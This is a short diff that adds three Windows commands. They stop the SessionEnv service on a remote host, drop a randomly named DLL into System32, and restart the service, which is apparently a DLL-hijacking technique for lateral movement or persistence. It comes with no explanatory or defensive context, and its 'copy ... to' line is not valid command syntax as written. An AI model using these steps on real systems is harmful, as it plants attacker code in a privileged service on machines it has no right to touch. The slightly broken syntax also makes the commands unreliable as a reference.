@@ -1,0 +1,3 @@
+sc.exe \\COMPUTER stop SessionEnv
+copy z4325wqykku.dll to C:\Windows\System32\z4325wqykku.dll
+sc.exe \\COMPUTER start SessionEnv
